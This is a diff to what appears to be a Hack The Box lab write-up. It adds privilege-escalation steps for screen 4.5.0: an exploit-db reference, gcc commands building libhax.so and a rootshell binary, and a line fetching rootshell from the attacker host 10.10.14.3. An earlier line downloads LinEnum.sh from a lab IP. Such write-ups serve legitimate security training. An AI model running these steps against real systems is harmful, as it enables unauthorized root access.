@@ -71,3 +71,24 @@ wget 10.10.14.2/LinEnum.sh
 screen 4.5.0
 ```
 ![image](https://user-images.githubusercontent.com/33616880/232672860-72151f75-c0e3-46f7-ba0c-22f08b39ec86.png)
+
+
+```
+https://www.exploit-db.com/exploits/41154
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/622a5695-9706-4cf5-9509-48a4bc1d4852)
+
+
+```
+gcc -fPIC -shared -ldl -o libhax.so libhax.c
+gcc -o rootshell rootshell.c
+http://10.10.14.3/rootshell -o uploads/rootshell
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/9314f3d0-e1ea-4206-abaa-47e6ea18b02e)
+![image](https://github.com/regarmulia/HTB/assets/33616880/2688ef7f-8a3c-4e36-bcb7-9da3478eb431)
+
+
+```
+execute
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/59bac660-ba8f-40ec-9db4-a25af662806a)
